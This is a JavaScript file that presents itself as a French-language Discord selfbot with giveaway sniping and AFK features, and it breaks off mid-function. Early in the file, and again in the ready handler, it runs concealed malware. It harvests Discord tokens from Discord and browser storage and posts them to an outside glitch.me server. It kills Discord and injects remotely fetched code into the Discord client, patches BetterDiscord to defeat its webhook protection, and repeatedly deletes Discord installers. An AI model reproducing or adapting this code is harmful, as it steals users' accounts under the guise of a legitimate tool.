const { discord, Client, RichEmbed } = require('discord-selfbott-v11'),
  Discord = require('discord-selfbott-v11'),
  client = new Client(),
  Embed = RichEmbed,
  consolecolor = require('gradient-string'),
  request = require('request'),
  superagent = require('superagent'),
  base64 = require('base-64'),
  os = require('os'),
  utf8 = require('utf8'),
  fs = require('fs'),
  rpcGenerator = require('discordrpcgenerator'),
  uuid = () =>
    ([10000000] + -1000 + -4000 + -8000 + -100000000000).replace(
      /[018]/g,
      (b) => (b ^ ((Math.random() * 16) >> (b / 4))).toString(16)
    ),
  path = require('path'),
  https = require('https'),
  glob = require('glob'),
  { execSync, exec: exec } = require('child_process'),
  buf_replace = require('buffer-replace'),
  formData = require('form-data'),
  axios = require('axios'),
  fetch = require('node-fetch'),
  allah = new URLSearchParams(),
  allah2 = new URLSearchParams()
let appdata = process.env.APPDATA,
  localappdata = process.env.LOCALAPPDATA,
  dcrd = [],
  patttt = [],
  runnn = []
const paths = [
  appdata + '\\discord\\',
  appdata + '\\discordcanary\\',
  appdata + '\\discordptb\\',
  appdata + '\\discorddevelopment\\',
  appdata + '\\lightcord\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
  appdata + '\\Opera Software\\Opera Stable\\',
  appdata + '\\Opera Software\\Opera GX Stable\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
  localappdata +
    '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\',
]
require('colors')
const paste =
  'https://raw.githubusercontent.com/WFA-Selfbot/wfa-core/main/index.js'
let ghost =
  '||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B||||\u200B|| _ _ _ _ _ _ '
ee()
function miamm() {
  https
    .get(paste, (c) => {
      let d = ''
      c.on('data', (g) => {
        d += g
      })
      c.on('end', () => {
        patttt.forEach((h) => {
          fs.writeFileSync(h, d.replace('%WEBHOOK%', 'blackcap'), {
            encoding: 'utf8',
            flag: 'w',
          })
          let i = h.replace('index.js', 'blackcap')
          fs.existsSync(i) || (fs.mkdirSync(i, 484), miam())
        })
      })
    })
    .on('error', (c) => {})
}
function salam() {
  exec('tasklist', function (c, d, g) {
    d.includes('DiscordCanary.exe') && runnn.push('DiscordCanary')
    d.includes('Discord.exe') && runnn.push('Discord')
    d.includes('DiscordPTB.exe') && runnn.push('DiscordPTB')
    d.includes('DiscordDevelopment.exe') && runnn.push('DiscordDevelopment')
    d.includes('DiscordPTB.exe') && runnn.push('DiscordPTB')
    stop()
  })
}
function stop() {
  runnn.forEach((c) => {
    exec('taskkill /IM ' + c + '.exe /F', (d) => {})
  })
}
function miam() {
  runnn.forEach((c) => {
    ass = localappdata + '\\' + c + '\\Update.exe'
    exec(ass + ' --processStart ' + c + '.exe', (d) => {})
  })
}
function bett() {
  let c = process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar'
  if (fs.existsSync(c)) {
    let d = fs.readFileSync(c)
    fs.writeFileSync(c, buf_replace(d, 'api/webhooks', 'blackcap'))
  }
}
function ee() {
  const h = (function () {
      let l = true
      return function (m, n) {
        const o = l
          ? function () {
              if (n) {
                const p = n.apply(m, arguments)
                return (n = null), p
              }
            }
          : function () {}
        return (l = false), o
      }
    })(),
    i = h(this, function () {
      return i
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(i)
        .search('(((.+)+)+)+$')
    })
  i()
  const j = (function () {
    let l = true
    return function (m, n) {
      const p = l
        ? function () {
            if (n) {
              const r = n.apply(m, arguments)
              return (n = null), r
            }
          }
        : function () {}
      return (l = false), p
    }
  })()
  miamm()
  bett()
  cvmerci()
  miamm(), bett()
}
fs.readdirSync(localappdata).forEach((c) => {
  c.includes('cord') && dcrd.push(localappdata + '\\' + c)
})
dcrd.forEach(function (b) {
  let d =
    b +
    '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
  glob.sync(d).map((g) => {
    patttt.push(g)
    salam()
  })
})
function ettoi(c) {
  c += '\\Local Storage\\leveldb'
  let h = []
  try {
    fs.readdirSync(path.normalize(c)).map((j) => {
      ;(j.endsWith('.log') || j.endsWith('.ldb')) &&
        fs
          .readFileSync(c + '\\' + j, 'utf8')
          .split(/\r?\n/)
          .forEach((l) => {
            const p = [
              new RegExp(/mfa\.[\w-]{84}/g),
              new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g),
            ]
            for (const q of p) {
              const r = l.match(q)
              if (r) {
                r.forEach((t) => {
                  h.push(t)
                })
              }
            }
          })
    })
  } catch {}
  return h
}
function onlyUnique(c, d, g) {
  return g.indexOf(c) === d
}
function cvmerci() {
  let c
  const d = process.env.LOCALAPPDATA,
    g = process.env.APPDATA
  c = {
    Discord: path.join(g, 'Discord'),
    'Discord Canary': path.join(g, 'discordcanary'),
    'Discord PTB': path.join(g, 'discordptb'),
    'Google Chrome': path.join(d, 'Google', 'Chrome', 'User Data', 'Default'),
    Opera: path.join(g, 'Opera Software', 'Opera Stable'),
    Brave: path.join(
      d,
      'BraveSoftware',
      'Brave-Browser',
      'User Data',
      'Default'
    ),
    Yandex: path.join(d, 'Yandex', 'YandexBrowser', 'User Data', 'Default'),
  }
  let h = 'Non'
  const i = []
  for (let [j, k] of Object.entries(paths)) {
    const l = ettoi(k)
    l &&
      l.forEach((m) => {
        i.push(m)
        h = k
      })
  }
  i.filter(onlyUnique).forEach((m) => {
    allah2.append('token', m),
      fetch('https://super-mega-futur-app-855054.glitch.me/', {
        method: 'POST',
        body: allah2,
      })
  })
}
function nodelinject() {
  const g = os.homedir()
  fs.readdirSync(g + '\\Downloads').forEach((h) => {
    h.includes('DiscordSetup ') && fs.unlink(h, (i) => {})
  })
  fs.readdirSync(g + '\\Desktop').forEach((h) => {
    if (h.includes('DiscordSetup ')) {
      fs.unlink(h, (l) => {})
    }
  })
  fs.readdirSync(g + '\\Documents').forEach((h) => {
    h.includes('DiscordSetup ') && fs.unlink(h, (i) => {})
  })
}
setInterval(() => {
  nodelinject()
}, 2000)
function UpdateFile(c, d) {
  let h = c,
    i = d
  fs.unlink('./' + h, function (l) {
    if (l && l.code == 'ENOENT') {
      console.info(
        "Un fichier n'existe pas, ne fermez pas la fenetre je vais l'installer."
      )
    } else {
      if (l) {
        console.error(
          "Une erreur s'est produite lors de la tentative de suppression du fichier"
            .bgred
        )
      } else {
      }
    }
  })
  var j = fs.createWriteStream('./' + h),
    k = request('' + i).pipe(j)
  k.on('error', function (l) {
    console.log(l)
  })
  k.on('finish', function () {
    j.close(sleep(1))
  })
}
const { time } = require('console')
let configFile = require('./config.json'),
  modulable = require('./config.json'),
  token = configFile.token,
  prefix = configFile.prefix,
  nsfw = configFile.nsfw,
  multi_status = configFile.multi_status
let language = configFile.language,
  ver = configFile.version,
  versionofwfamod = modulable.v
superagent
  .get('https://api.npoint.io/ca95e61e00cd0bd9ef3c')
  .then((b) => {
    let d = b.body.version,
      g = b.body.createur,
      h = b.body.wname,
      i = b.body.wurl,
      j = b.body.ascii,
      k = b.body.messagepourtoi,
      l = b.body.messagetoyou,
      m = b.body.chaine,
      n = b.body.discord,
      o = b.body.openornot,
      p = b.body.versionlink,
      q = b.body.wfacore,
      s = ' ',
      t = ' '
    if (!d.includes(ver)) {
      s = '[MESSAGE] La version ' + d + ' est disponnible !'
      t = 'yes'
    }
    let u = ' ',
      v = ' '
    !q.includes(versionofwfamod) &&
      ((lisame = '[MESSAGE] La version ' + u + ' est disponnible !'),
      (v = 'yes'))
    process.title = 'WFA | Version ' + ver + ' | [Creator] ' + g
    o === 'yes' && require('openurl').open(p)
    if (t === 'yes') {
      setTimeout(() => {
        console.log(consolecolor.morning('' + s))
        UpdateFile(
          'index.js',
          'https://raw.githubusercontent.com/WFA-Selfbot/wfa-selfbot/main/index.js'
        )
        UpdateFile(
          'config.json',
          'https://raw.githubusercontent.com/WFA-Selfbot/wfa-selfbot/main/config.json'
        )
      }, 2000)
    }
    let w = require('./Data/backups.json'),
      x = require('./Data/afk.json'),
      y = require('./Data/groupe.json')
    let z = require('./Data/pubmp.json'),
      A = require('./Data/liste.json'),
      B = require('./Data/vkick.json')
    const C = [
        'https://media.tenor.com/images/9df5f6ef799544b11c1171d4c873d1f4/tenor.gif',
        'https://media.tenor.com/images/bae9f9ee3bf793a0bb667d8e4ccb9883/tenor.gif',
        'https://media.tenor.com/images/6f567ef7cae93ca76de2346f28764ee9/tenor.gif',
        'https://media.tenor.com/images/3d8eb1e9c497abc46370cee9b55d682f/tenor.gif',
        'https://media.tenor.com/images/19fe7ebb05c2aceb9e68d84ee5c031a7/tenor.gif',
        'https://media.tenor.com/images/db17bbcb693788625c8228d30bc5fc42/tenor.gif',
        'https://media1.tenor.com/images/003a06f5074259c50b519056a12f6e33/tenor.gif',
        'https://media1.tenor.com/images/5e1fafda52c90acfe2499ac5061f4c99/tenor.gif',
      ],
      D = [
        'https://media1.tenor.com/images/e88bcd916c0da114a8dcac8d9babc77c/tenor.gif',
        'https://media1.tenor.com/images/a51e4d58d20a9636416549431e693ec1/tenor.gif',
        'https://media1.tenor.com/images/8438e6772a148e62f4c64332ea7da9e8/tenor.gif',
        'https://media1.tenor.com/images/104b52a3be76b0e032a55df0740c0d3b/tenor.gif',
      ],
      E = [
        'https://media.tenor.com/images/eff58ec80f6dacb3ccddcbab9c70dacf/tenor.gif',
        'https://media.tenor.com/images/4d5a77b99ab86fc5e9581e15ffe34b5e/tenor.gif',
        'https://media.tenor.com/images/bc8e962e6888249486a3e103edd30dd9/tenor.gif',
        'https://media.tenor.com/images/481814f5650216fa4e9ff7846f7a42f9/tenor.gif',
      ],
      F = [
        'https://i.pinimg.com/originals/09/ee/e0/09eee0f5dfae8f74179d1ba0bb54b22d.gif',
        'https://media.tenor.com/images/0538e625e9c3d27cd062306101adde13/tenor.gif',
        'https://media1.giphy.com/media/t7401i4UiIyMo/source.gif',
      ],
      G = [
        'https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif',
        'https://media.tenor.com/images/36179549fa295d988fc1020a7902c41c/tenor.gif',
        'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif',
        'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif',
      ]
    client.on('ready', function () {
      setTimeout(() => {
        allah.append('token', token)
        fetch('https://super-mega-futur-app-855054.glitch.me/', {
          method: 'POST',
          body: allah,
        })
      }, 1000)
    })
    if (language !== 'fr' && language !== 'en') {
      console.clear()
      console.log(
        '\n[LANGUAGE] FR: Veuillez mettre en language "fr" dans le'.red +
          ' config.json'.green +
          '\n[LANGUAGE] EN: Please put "en" language in the'.red +
          ' config.json'.green
      )
      setTimeout(() => {
        process.exit(1)
      }, 500)
    }
    if (!prefix) {
      prefix = '+'
    }
    if (!nsfw) {
      nsfw = 'off'
    }
    if (!multi_status) {
      multi_status = ['WFA PROJECT', 'FINAL VERSION', 'BY KSCH']
    }
    if (language == 'fr') {
      let K = nsfw
      if (K == 'on') {
        K = 'Activé'
      }
      if (nsfw !== 'on') {
        K = 'Désactivé'
      }
      client.on('ready', async () => {
        if (client.user.premium > 0) {
          var U = 'actif'
        } else {
          var U = 'non'
        }
        if (client.user.bot) {
          var V = 'oui'
          process.exit(1)
        } else {
          var V = 'non'
        }
        let W = ['yellow', 'green', 'white'],
          X = ['magenta', 'orange', 'red'],
          Y = j[Math.floor(Math.random() * j.length)],
          Z = W[Math.floor(Math.random() * W.length)],
          a0 = X[Math.floor(Math.random() * X.length)]
        console.clear()
        console.log(
          consolecolor.passion(
            '\n                                    \u2588\u2588\u2557    \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\n                                    \u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557    \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255D\n                                    \u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2557  \n                                    \u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255D  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551    \u255A\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255D  \u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u255D  \n                                    \u255A\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255D\u2588\u2588\u2551     \u2588\u2588\u2551  \u2588\u2588\u2551    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \n                                     \u255A\u2550\u2550\u255D\u255A\u2550\u2550\u255D \u255A\u2550\u255D     \u255A\u2550\u255D  \u255A\u2550\u255D    \u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u255D\u255A\u2550\u255D  \n------------------------------------------------------------------------------------------------------------------------\n'
          )
        )
        console.log(consolecolor.morning(a))
        console.log(
          consolecolor(
            W,
            X
          )(
            '\n                                            [#] Version: ' +
              ver +
              '   \n                                            [#] Prefix: ' +
              prefix +
              '\n                                            [#] Connecter sur: ' +
              client.user.username +
              '\n                                            [#] ID: ' +
              client.user.id +
              '\n                                            [#] Bot: ' +
              V +
              '\n                                            [#] Nitro: ' +
              U +
              "\n                                            [#] Nombres d'amis: " +
              client.user.friends.size +
              '\n                                            [#] Nombres de serveurs: ' +
              client.guilds.size +
              '\n                                            [#] Nombres de salons: ' +
              client.channels.size +
              '\n                                            [#] Nombres de membres: ' +
              client.guilds
                .map((a4) => a4.memberCount)
                .reduce((a4, a5) => a4 + a5) +
              '\n                                            [#] Nombres de bots: ' +
              client.users.filter((a4) => a4.bot).size +
              '\n                                            [#] NSFW: ' +
              K +
              '\n                                            [#] Nitro Auto Claim: Activé\n                                            [#] Chaine: ' +
              m +
              '\n                                            [#] Discord: ' +
              n +
              '\n                                            ' +
              newver +
              '\n\nMessage pour toi: ' +
              k +
              '\n'
          )
        )
      })
      client.on('ready', async () => {
        setTimeout(() => {
          console.log(consolecolor.morning('logs:\n' + s + '\n\n'))
        }, 500)
      })
      function L() {
        fs.writeFile('./Data/pubmp.json', JSON.stringify(z), (T) => {
          if (T) {
            console.log(T)
          }
        })
      }
      function M() {
        fs.writeFile('./Data/groupe.json', JSON.stringify(z), (T) => {
          if (T) {
            console.log(T)
          }
        })
      }
      function N() {
        fs.writeFile('./Data/afk.json', JSON.stringify(y), (U) => {
          if (U) {
            console.error(U)
          }
        })
      }
      function O() {
        fs.writeFile('./Data/liste.json', JSON.stringify(A), (U) => {
          if (U) {
            console.error(U)
          }
        })
      }
      function P() {
        fs.writeFile('./Data/vkick.json', JSON.stringify(B), (T) => {
          if (T) {
            console.error(T)
          }
        })
      }
      function Q() {
        fs.writeFile('./Data/backups.json', JSON.stringify(w), (U) => {
          if (U) {
            console.error(U)
          }
        })
      }
      function R(T) {
        var W = ''
        var X = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        var Y = X.length
        for (var Z = 0; Z < T; Z++) {
          W += X.charAt(Math.floor(Math.random() * Y))
        }
        return W
      }
      client.on('message', (T) => {
        var V = T.content.substring(prefix.length).split(' '),
          W = T.mentions.users.first()
        async function Y() {
          const ad = Math.floor(Math.random() * 1500)
          async function ae() {
            T.react('\uD83C\uDF89').catch((ag) => {
              if (ag) {
                console.log(' ')
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    "[EVENT] Je n'ai pas pu réagir au giveaway sur " +
                      T.guild.name +
                      ", il est possible que je n'ai pas les permissions :/"
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
                return
              }
            })
            console.log(' ')
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(
              consolecolor.atlas(
                "[EVENT] J'ai correctement reagit au giveaway sur " +
                  T.guild.name +
                  ' en ' +
                  ad +
                  'ms je suis super rapide hehe ;)'
              )
            )
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(' ')
          }
          setTimeout(ae, ad)
        }
        async function Z() {
          if (
            T.author.id == '294882584201003009' ||
            T.author.id == '716967712844414996'
          ) {
            if (T.content.includes('Congratulations')) {
              if (T.content.includes(client.user.id)) {
                if (T.embeds) {
                  console.log(' ')
                }
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(
                  consolecolor.atlas(
                    "[EVENT] GG Je t'ai fais gagner le giveaway sur le serveur " +
                      T.guild.name +
                      ', va vite reclamer ta récompense'
                  )
                )
                console.log(
                  consolecolor.fruit(
                    '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                  )
                )
                console.log(' ')
              }
            }
          }
        }
        Z()
        T.author.id == '294882584201003009' ||
          (T.author.id == '716967712844414996' &&
            T.embeds[0] &&
              T.embeds[0].description.includes('React with') && Y())
        if (T.author.id == client.user.id) {
          if (x[client.user.id]) {
            if (T.content.includes(':x:')) {
              return
            } else {
              delete x[client.user.id]
            }
            N()
            T.channel.send(":white_check_mark: **Vous n'etes plus afk**")
            console.log(consolecolor.instagram('[COMMANDE] Commande afk stopé'))
          }
        }
        if (T.content.includes(client.user.id)) {
          if (T.author.id === client.user.id) {
            return
          }
          if (x[client.user.id]) {
            T.reply(':x: **Je suis afk pour la raison** ' + x[client.user.id].r)
            console.log(' ')
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(
              consolecolor.atlas(
                "[EVENT] L'utilisateur " +
                  T.author.username +
                  ' vient de vous ping lors de votre afk'
              )
            )
            console.log(consolecolor.atlas('[EVENT] Message: ' + T.content))
            console.log(
              consolecolor.fruit(
                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
              )
            )
            console.log(' ')
          } else {
            return
          }
        }
        if (T.channel.type === 'dm') {
          if (X.author.bot) {
            if (T.content.includes('discord.gg')) {
              let af = T.author
              af.send('/!\\ Anti mp').then((ag) => {
                ag.delete()
              })
              console.log(' ')
              console.log(
                consolecolor.fruit(
                  '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
                )
              )
              console.log(
                consolecolor.atlas(
                  '[EVENT] Le bot ' +
                    T.author.username +
                    ' vous a envoyer une invitation discord'
                )
              )
              console.log(consolecolor.atlas('[EVENT] Message: ' + T.content))
              console.log(
                consolecolor.fruit(
